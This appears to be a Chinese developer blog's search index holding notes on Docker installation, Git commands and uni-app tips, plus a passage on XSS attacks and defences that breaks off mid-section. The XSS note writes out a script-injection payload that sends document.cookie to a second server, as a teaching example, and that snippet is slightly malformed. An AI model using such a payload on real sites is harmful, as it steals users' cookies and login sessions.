<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker安装</title>
    <url>/2020/09/08/Docker%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>记录一下在云服务器上安装Docker过程。</p>
</blockquote>
<a id="more"></a>

<h5 id="1-选择国内的云服务商，这里选择阿里云为例"><a href="#1-选择国内的云服务商，这里选择阿里云为例" class="headerlink" title="1.选择国内的云服务商，这里选择阿里云为例"></a>1.选择国内的云服务商，这里选择阿里云为例</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">curl -sSL http:<span class="comment">//acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -</span></span><br></pre></td></tr></table></figure>
<h5 id="2-安装所需要的包"><a href="#2-安装所需要的包" class="headerlink" title="2.安装所需要的包"></a>2.安装所需要的包</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual</span><br></pre></td></tr></table></figure>

<h5 id="3-添加使用-HTTPS-传输的软件包以及-CA-证书"><a href="#3-添加使用-HTTPS-传输的软件包以及-CA-证书" class="headerlink" title="3.添加使用 HTTPS 传输的软件包以及 CA 证书"></a>3.添加使用 HTTPS 传输的软件包以及 CA 证书</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get update sudo apt-get install apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>

<h5 id="4-添加GPG密钥"><a href="#4-添加GPG密钥" class="headerlink" title="4.添加GPG密钥"></a>4.添加GPG密钥</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp:<span class="comment">//p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span></span><br></pre></td></tr></table></figure>

<h5 id="5-添加软件源"><a href="#5-添加软件源" class="headerlink" title="5.添加软件源"></a>5.添加软件源</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;deb https://apt.dockerproject.org/repo ubuntu-xenial main&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<h5 id="6-添加成功后更新软件包缓存"><a href="#6-添加成功后更新软件包缓存" class="headerlink" title="6.添加成功后更新软件包缓存"></a>6.添加成功后更新软件包缓存</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<h5 id="7-安装docker"><a href="#7-安装docker" class="headerlink" title="7.安装docker"></a>7.安装docker</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-engine</span><br></pre></td></tr></table></figure>

<h5 id="8-启动-docker"><a href="#8-启动-docker" class="headerlink" title="8.启动 docker"></a>8.启动 docker</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable docker sudo systemctl start docker</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>部署运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>部署</tag>
      </tags>
  </entry>
  <entry>
    <title>Git使用总结</title>
    <url>/2020/09/07/Git%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
<p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目，在这里做一下Git使用的总结。</p>
</blockquote>
<a id="more"></a>

<h4 id="1、文档查询"><a href="#1、文档查询" class="headerlink" title="1、文档查询"></a>1、文档查询</h4><ul>
<li><code>git help (--help)</code>    一一 展示Git命令大纲</li>
<li><code>git help -a</code>    一一 展示Git命令大纲全部列表</li>
<li><code>git help &lt;command&gt;</code>    一一 展示具体命令说明手册</li>
</ul>
<h4 id="2、配置命令"><a href="#2、配置命令" class="headerlink" title="2、配置命令"></a>2、配置命令</h4><ul>
<li><code>git config list</code>    一一 列出当前配置</li>
<li><code>git config --local --list</code>    一一 列出仓库设置</li>
<li><code>git config --global --list</code>    一一 列出全局配置</li>
<li><code>git config --system --list</code>    一一 列出系统配置</li>
<li><code>git config --global user.name</code>    一一 配置用户名</li>
<li><code>git config  --global user.email</code>    一一 配置用户邮箱</li>
</ul>
<h4 id="3、分支管理"><a href="#3、分支管理" class="headerlink" title="3、分支管理"></a>3、分支管理</h4><ul>
<li><code>git branch</code>    一一 查看本地分支</li>
<li><code>git branch -r</code>    一一 查看远程分支</li>
<li><code>git branch -a</code>    一一 查看本地和远程分支</li>
<li><code>git checkout &lt;branch-name&gt;</code>    一一 从当前分支切换到其他分支</li>
<li><code>git checkout -b &lt;branch-name&gt;</code>    一一 创建并切换到新建分支</li>
<li><code>git branch -d &lt;branch-name&gt;</code>    一一 删除分支</li>
<li><code>git merge &lt;branch-name&gt;</code>    一一 当前分支与指定分支合并</li>
<li><code>git branch --merged</code>    一一 查看哪些分支已经合并到当前分支</li>
<li><code>git branch --no-merged</code>    一一 查看哪些分支没有合并到当前分支</li>
<li><code>git branch -v</code>    一一 查看各个分支最后一个提交对象的信息</li>
<li><code>git push origin --d &lt;branch-name&gt;</code>    一一 删除远程分支</li>
<li><code>git branch -m &lt;oldbranch-name&gt;&lt;newbranch-name&gt;</code>    一一 重命名分支</li>
<li><code>git checkout -b 本地分支名x origin/远程分支名x</code>    一一 拉取远程分支并创建本地分支</li>
</ul>
<h4 id="4、fetch指令"><a href="#4、fetch指令" class="headerlink" title="4、fetch指令"></a>4、fetch指令</h4><ul>
<li><code>git fetch &lt;远程主机名&gt;</code>    一一 将某个远程主机的更新，全部拉取回本地</li>
<li><code>git fetch &lt;远程主机名&gt; &lt;分支名&gt;</code>    一一 取回特定分支</li>
<li><code>git fetch origin &lt;remote-branch-name&gt; &lt;local-branch-name&gt;</code>    一一 取回特定分支，并拉取到本地分支</li>
</ul>
<h4 id="5、文件暂存"><a href="#5、文件暂存" class="headerlink" title="5、文件暂存"></a>5、文件暂存</h4><ul>
<li><code>git stash save -a &#39;message&#39;</code>    一一 添加改动到stash</li>
<li><code>git stash drop &lt;stash@[ID]</code>    一一 删除暂存</li>
<li><code>git stash list</code>    一一 查看stash列表</li>
<li><code>git stash clear</code>    一一 删除全部缓存</li>
<li><code>git stash pop &lt;stash@[ID]&gt;</code>    一一 恢复改动</li>
<li><code>git apply &lt;stash@[ID]&gt;</code>    一一 将某个暂存取出来并保存stash列表</li>
</ul>
<h4 id="6、撤销相关"><a href="#6、撤销相关" class="headerlink" title="6、撤销相关"></a>6、撤销相关</h4><ul>
<li><code>git checkout -- &lt;file&gt;</code>    一一 撤销“工作区”修改</li>
<li><code>git reset HEAD &lt;file&gt;</code>    一一 暂存区文件撤销(不覆盖工作区)</li>
<li><code>git reset --hard &lt;commit ID&gt;</code>    一一 版本回退</li>
</ul>
<h4 id="7、差异比较"><a href="#7、差异比较" class="headerlink" title="7、差异比较"></a>7、差异比较</h4><ul>
<li><code>git diff</code>    一一 比较工作区与缓存区</li>
<li><code>git diff --cached</code>    一一 比较缓存区与本地库最近一次commit内容</li>
<li><code>git diff HEAD</code>    一一 比较工作区与本地最近一次commit内容</li>
<li><code>git diff &lt;commit ID&gt; &lt;commit ID&gt;</code>    一一 比较两个commit之间的差异</li>
</ul>
<h4 id="8、Git文件状态"><a href="#8、Git文件状态" class="headerlink" title="8、Git文件状态"></a>8、Git文件状态</h4><p><code>git status</code>查看文件状态</p>
<ul>
<li><code>untracked</code>    在暂存区没有该文件</li>
<li><code>modified</code>      文件发生了修改</li>
</ul>
<h4 id="9、分支管理规范"><a href="#9、分支管理规范" class="headerlink" title="9、分支管理规范"></a>9、分支管理规范</h4><ul>
<li><code>master</code>分支<ul>
<li>主分支，用于部署生产环境的分支，确保稳定性。</li>
<li><code>master</code>分支一般由<code>develop</code>以及<code>hotfix</code>分支合并，任何情况下都不能直接修改代码</li>
</ul>
</li>
<li><code>develop</code>分支<ul>
<li><code>develop</code>为开发分支，通常情况下，保存最新完成及bug修复后的代码。</li>
<li>开发新功能时，<code>feature</code>分支都是基于<code>develop</code>分支下创建的。</li>
</ul>
</li>
<li><code>feature</code>分支<ul>
<li>开发新功能，基本上以<code>develop</code>为基础创建<code>feature</code>分支。</li>
<li>分支命名:<code>feature/</code>开头的为特性分支，命名规则:<code>feature/user_module</code>、<code>feature/cart_module</code>。</li>
</ul>
</li>
<li><code>release</code>分支<ul>
<li><code>release</code>分支为预上线分支，发布提测阶段，会以<code>release</code>分支代码为基准提测。</li>
</ul>
</li>
<li><code>hotfix</code>分支<ul>
<li>分支命名:<code>hotfix/</code>开头的为修复分支，命名规则与feature分支类似。</li>
<li>出现bug时，需要及时修复，以<code>master</code>分支为基线，创建<code>hotfix</code>分支，修复完成后，需要合并到<code>master</code>分支和<code>develop</code>分支。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>版本管理</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本管理</tag>
      </tags>
  </entry>
  <entry>
    <title>uni-app使用总结</title>
    <url>/2020/09/05/uni-app%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
<p>uni-app 是一个使用 Vue.js开发所有前端应用的框架，开发者编写一套代码，可发布到iOS、Android、H5、以及各种小程序（微信/支付宝/百度/头条/QQ/钉钉/淘宝）、快应用等多个平台，也使用uni-app开发了几个项目了，在这里对uni-app的使用做一些总结记录。</p>
</blockquote>
<a id="more"></a>

<h4 id="1、使用动画"><a href="#1、使用动画" class="headerlink" title="1、使用动画"></a>1、使用动画</h4><ul>
<li><p>下载animate.css</p>
</li>
<li><p>将文件拷贝到项目资源文件夹common内</p>
</li>
<li><p>在App.vue文件里面引用该动画库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;App.vue</span><br><span class="line">&#x2F;&#x2F;...</span><br><span class="line">&lt;style&gt;</span><br><span class="line">	&#x2F;&#x2F;引入样式文件</span><br><span class="line">    import &#39;.&#x2F;common&#x2F;animate.css&#39;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="2、应用字体图标"><a href="#2、应用字体图标" class="headerlink" title="2、应用字体图标"></a>2、应用字体图标</h4><ul>
<li><p>去iconfont官网将选好的图标加入到自己的项目里面进行管理</p>
</li>
<li><p>下载字体文件和示例压缩包</p>
</li>
<li><p>将iconfont.css拷贝到资源文件夹common内</p>
</li>
<li><p>在App.vue中引入该样式文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">	&#x2F;&#x2F;引入字体文件</span><br><span class="line">    import &#39;.&#x2F;common&#x2F;iconfont.css&#39;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>打开iconfont.css文件，将里面的<code>@font-face</code>里面的url只保留base64位的数据就行。</p>
</li>
<li><p>使用如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;text class&#x3D;&quot;iconfont icon-user&quot;&gt;&lt;&#x2F;text&gt;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="3、UI框架"><a href="#3、UI框架" class="headerlink" title="3、UI框架"></a>3、UI框架</h4><ul>
<li>ColorUI-UniApp</li>
</ul>
<h4 id="4、清除缓存"><a href="#4、清除缓存" class="headerlink" title="4、清除缓存"></a>4、清除缓存</h4><ul>
<li><p>获取数据缓存信息</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    uni.clearStorageSync();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="comment">//error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除本地缓存</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    uni.clearStorageSync();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="comment">//error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="5、检测更新"><a href="#5、检测更新" class="headerlink" title="5、检测更新"></a>5、检测更新</h4><ul>
<li><p>核心代码如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #ifdef APP-PLUS</span></span><br><span class="line">plus.runtime.getProperty(plus.runtime.appid, <span class="function"><span class="keyword">function</span>(<span class="params">widgetInfo</span>) </span>&#123;  </span><br><span class="line">    uni.request(&#123;  </span><br><span class="line">        url: <span class="string">&#x27;http://www.example.com/update/&#x27;</span>,  </span><br><span class="line">        data: &#123;  </span><br><span class="line">            version: widgetInfo.version,  </span><br><span class="line">            name: widgetInfo.name  </span><br><span class="line">        &#125;,  </span><br><span class="line">        success: <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;  </span><br><span class="line">            <span class="keyword">var</span> data = result.data;  </span><br><span class="line">            <span class="keyword">if</span> (data.update &amp;&amp; data.wgtUrl) &#123;  </span><br><span class="line">                uni.downloadFile(&#123;  </span><br><span class="line">                    url: data.wgtUrl,  </span><br><span class="line">                    success: <span class="function">(<span class="params">downloadResult</span>) =&gt;</span> &#123;  </span><br><span class="line">                        <span class="keyword">if</span> (downloadResult.statusCode === <span class="number">200</span>) &#123;  </span><br><span class="line">                            plus.runtime.install(downloadResult.tempFilePath, &#123;  </span><br><span class="line">                                force: <span class="literal">false</span>  </span><br><span class="line">                            &#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">                                <span class="built_in">console</span>.log(<span class="string">&#x27;install success...&#x27;</span>);  </span><br><span class="line">                                plus.runtime.restart();  </span><br><span class="line">                            &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">                                <span class="built_in">console</span>.error(<span class="string">&#x27;install fail...&#x27;</span>);  </span><br><span class="line">                            &#125;);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;);  </span><br><span class="line">&#125;);  </span><br><span class="line"><span class="comment">// #endif</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="6、网络检测"><a href="#6、网络检测" class="headerlink" title="6、网络检测"></a>6、网络检测</h4><ul>
<li><p>检测网络状态</p>
<table>
<thead>
<tr>
<th>值</th>
<th>说明</th>
<th align="left">平台差异说明</th>
</tr>
</thead>
<tbody><tr>
<td>wifi</td>
<td>wifi 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>2g</td>
<td>2g 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>3g</td>
<td>3g 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>4g</td>
<td>4g 网络</td>
<td align="left"></td>
</tr>
<tr>
<td>ethernet</td>
<td>有线网络</td>
<td align="left">App</td>
</tr>
<tr>
<td>unknown</td>
<td>Android 下不常见的网络类型</td>
<td align="left"></td>
</tr>
<tr>
<td>none</td>
<td>无网络</td>
<td align="left"></td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">uni.getNetworkType(&#123;</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res.networkType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>监听网络状态变化</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>类型</th>
<th>说明</th>
<th>平台差异说明</th>
</tr>
</thead>
<tbody><tr>
<td>isConnected</td>
<td>Boolean</td>
<td>当前是否有网络连接</td>
<td>字节跳动小程序不支持</td>
</tr>
<tr>
<td>networkType</td>
<td>String</td>
<td>网络类型</td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">uni.onNetworkStatusChange(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res.isConnected);</span><br><span class="line">    <span class="built_in">console</span>.log(res.networkType);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="7、自定义导航栏"><a href="#7、自定义导航栏" class="headerlink" title="7、自定义导航栏"></a>7、自定义导航栏</h4><ul>
<li><p><code>custom-navbar.vue</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;custom-bar&quot;&gt;</span><br><span class="line">			&lt;!-- #ifdef APP-PLUS --&gt;</span><br><span class="line">			&lt;view class&#x3D;&quot;status-bar&quot; :style&#x3D;&quot;&#123;height:statusBarHeight+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">			&lt;!-- #endif --&gt;</span><br><span class="line">			&lt;view class&#x3D;&quot;nav-bar&quot;&gt;</span><br><span class="line">				最新</span><br><span class="line">			&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;!-- 占位 --&gt;</span><br><span class="line">		&lt;view :style&#x3D;&quot;&#123;height:navBarHeight+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">	&lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			return &#123;</span><br><span class="line">				navBarHeight:0,</span><br><span class="line">				statusBarHeight:0</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;,</span><br><span class="line">		mounted() &#123;</span><br><span class="line">			this.navBarHeight&#x3D;uni.upx2px(100);</span><br><span class="line">			&#x2F;&#x2F; #ifdef APP-PLUS</span><br><span class="line">			this.statusBarHeight&#x3D;plus.navigator.getStatusbarHeight();</span><br><span class="line">			this.navBarHeight&#x3D;this.statusBarHeight+uni.upx2px(100);</span><br><span class="line">			&#x2F;&#x2F; #endif</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang&#x3D;&quot;scss&quot;&gt;</span><br><span class="line">	.custom-bar&#123;</span><br><span class="line">		position:fixed;</span><br><span class="line">		left:0;</span><br><span class="line">		right:0;</span><br><span class="line">		top:0;</span><br><span class="line">	&#125;</span><br><span class="line">	.status-bar&#123;</span><br><span class="line">		background:#06A0D6;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-bar&#123;</span><br><span class="line">		height:100rpx;</span><br><span class="line">		font-size:41.66rpx;</span><br><span class="line">		color:#FFF;</span><br><span class="line">		background:#06a0d6;</span><br><span class="line">		line-height:100rpx;</span><br><span class="line">		text-align:center;</span><br><span class="line">		background:blue;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-pad&#123;</span><br><span class="line">		height:100rpx;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>index.vue</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;custom-navbar ref&#x3D;&#39;custombar&#39;&gt;&lt;&#x2F;custom-navbar&gt;</span><br><span class="line">		&lt;!-- 筛选框 --&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;filter-box&quot; :style&#x3D;&quot;&#123;top:filterBoxTop+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;select-time&quot; :style&#x3D;&quot;&#123;top:timeSelectTop+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;pad&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">			&lt;view class&#x3D;&quot;item&quot; v-for&#x3D;&quot;(item,index) in 100&quot; :Key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">				&#123;&#123;index+1&#125;&#125;</span><br><span class="line">			&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;&#x2F;view&gt;</span><br><span class="line">	&lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;template&gt;	</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			return &#123;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		methods: &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang&#x3D;&quot;scss&quot;&gt;</span><br><span class="line">.filter-box&#123;</span><br><span class="line">	position:fixed;</span><br><span class="line">	left:0;</span><br><span class="line">	right:0;</span><br><span class="line">	height:100rpx;</span><br><span class="line">	background:yellow;</span><br><span class="line">	z-index:10;</span><br><span class="line">&#125;</span><br><span class="line">.select-time&#123;</span><br><span class="line">	position: fixed;</span><br><span class="line">	left:0;</span><br><span class="line">	right:0;</span><br><span class="line">	height:85.41rpx;</span><br><span class="line">	background:orange;</span><br><span class="line">	z-index:10;</span><br><span class="line">&#125;</span><br><span class="line">.pad&#123;</span><br><span class="line">	height:185.41rpx;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>navbar.mixin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default&#123;</span><br><span class="line">	data()&#123;</span><br><span class="line">		return &#123;</span><br><span class="line">			filterBoxTop:0,</span><br><span class="line">			timeSelectTop:0</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	mounted()&#123;</span><br><span class="line">		if(this.$refs[&#39;custombar&#39;])&#123;</span><br><span class="line">			this.filterBoxTop&#x3D;this.$refs[&#39;custombar&#39;].navBarHeight;</span><br><span class="line">			this.timeSelectTop&#x3D;this.filterBoxTop+uni.upx2px(85.41);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="8、封装、使用工具函数"><a href="#8、封装、使用工具函数" class="headerlink" title="8、封装、使用工具函数"></a>8、封装、使用工具函数</h4><ul>
<li><p>在common文件夹内新建一个util.js文件</p>
</li>
<li><p>在里面封装一些工具函数并导出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//util.js</span></span><br><span class="line"><span class="keyword">const</span> formatTime=<span class="function">()=&gt;</span>&#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    formatTime</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在main.js里面引入并挂载到Vue的原型上</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> utils <span class="keyword">from</span> <span class="string">&#x27;./common/util.js&#x27;</span></span><br><span class="line">Vue.prototype.$util=utils</span><br></pre></td></tr></table></figure>
</li>
<li><p>页面中使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.vue</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">methods:&#123;</span><br><span class="line">    formatTime(time)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.$util.formatTime(time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h4 id="9、Api统一管理"><a href="#9、Api统一管理" class="headerlink" title="9、Api统一管理"></a>9、Api统一管理</h4><ul>
<li><p>新建apis文件夹，里面依据业务新建不同的接口文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="keyword">import</span> http <span class="keyword">from</span> <span class="string">&#x27;../../commons/http&#x27;</span></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 测试接口</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//获取列表</span></span><br><span class="line"> <span class="keyword">const</span> getList=<span class="function"><span class="params">data</span>=&gt;</span>&#123;</span><br><span class="line"> 	<span class="keyword">return</span> http(&#123;</span><br><span class="line"> 		url:<span class="string">&#x27;/app/list&#x27;</span>,</span><br><span class="line"> 		data</span><br><span class="line"> 	&#125;);</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">	 getList</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>在apis文件中新建一个index.js主文件，检测接口函数并自动导出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用require.context自动导出api接口函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> apis=<span class="built_in">require</span>.context(<span class="string">&#x27;.&#x27;</span>,<span class="literal">true</span>,<span class="regexp">/.js$/</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> apisObj=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">apis.keys().forEach(<span class="function"><span class="params">key</span>=&gt;</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(key === <span class="string">&#x27;./index.js&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">let</span> obj=apis(key).default;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">		apisObj[key]=obj[key];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">	...apisObj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在main.js里面引入接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入api</span></span><br><span class="line"><span class="keyword">import</span> apis <span class="keyword">from</span> <span class="string">&#x27;./apis/index&#x27;</span>;</span><br><span class="line"><span class="comment">//挂载到Vue原型上面</span></span><br><span class="line">Vue.prototype.$api=apis;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用方法如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.$api.getList().then(<span class="function"><span class="params">res</span>=&gt;</span><span class="built_in">console</span>.log(res)).catch(<span class="function"><span class="params">err</span>=&gt;</span><span class="built_in">console</span>.log(err))</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>跨平台开发</category>
      </categories>
      <tags>
        <tag>uni-app</tag>
        <tag>app</tag>
        <tag>跨平台</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全问题及防御</title>
    <url>/2020/09/13/web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、XSS攻击-跨站点脚本攻击–cross-site-scripting"><a href="#1、XSS攻击-跨站点脚本攻击–cross-site-scripting" class="headerlink" title="1、XSS攻击(跨站点脚本攻击–cross site scripting)"></a>1、XSS攻击(跨站点脚本攻击–cross site scripting)</h5><p>通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或Javascript进行的一种攻击。</p>
<pre><code>通常会找那些输入框或者地址参数栏进行测试，看是否能执行脚本，是否存在漏洞
例如
    http://localhost:3000?from=china;
修改成
    http://localhost:3000?from=&lt;script&gt;alert(1)&lt;/script&gt;

如果有弹出框，证明存在漏洞，可以插入脚本进行攻击

例如
    http://localhost:3000?from=&lt;script src=&quot;http://localhost:4000/getImg.js&quot;&gt;&lt;/script&gt;

getImg.js如下:
    let img=new Image();
    img.src&quot;http://localhost:4000?cookie=document.cookie&quot;;

这样 http://localhost:4000就能通过图片的请求处理拿到客户端的cookie
    let cookie=req.cookie;
    console.log(cookie);

XSS的危害:
    1、获取页面数据
    2、获取cookies
    3、发送请求
    4、劫持前端逻辑
    5、偷取网站的任意数据
    6、偷取用户的资料
    7、偷取用户的秘密和登录态
    8、欺骗用户

防御手段:
1、响应头部字段X-Xss-Protection
    0：禁止XSS过滤
    1:启用XSS过滤，浏览器默认启用，如果检测到攻击，浏览器将清除页面(删除不安全的部分)
    1;mode=block启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻塞页面加载
    1;report=(Chromium  only)
